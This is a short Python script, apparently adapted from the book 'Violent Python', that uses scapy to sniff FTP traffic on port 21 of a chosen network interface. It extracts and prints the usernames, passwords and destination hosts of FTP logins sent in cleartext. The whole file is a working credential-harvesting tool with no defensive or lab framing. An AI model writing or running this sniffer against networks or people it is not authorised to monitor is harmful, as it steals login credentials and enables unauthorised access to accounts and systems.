#!/usr/bin/env python3
from __future__ import print_function 
from scapy.all import *
import argparse
'''FTP Credential Sniffer - based on Violent Python '''
def ftpSniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)',raw)
    pswd = re.findall('(?i)PASS (.*)',raw)
    if user:
        print('[*] Detected FTP login to ' + str(dest))
        print('[*] User Account: ' + str(user[0]))
    elif pswd:
        print('[*] password: ' + str(pswd[0]))
def main():
    parser=argparse.ArgumentParser()
    parser.add_argument('-i', required='true', metavar='interface', help='Specify the interface to listen on')
    args = parser.parse_args()
    if args.i == None:
         exit(0)
    else:
        conf.iface = args.i
    try:
        sniff(filter='tcp port 21', prn=ftpSniff)
    except KeyboardInterrupt:
        exit(0)
if __name__ == '__main__':
    main()
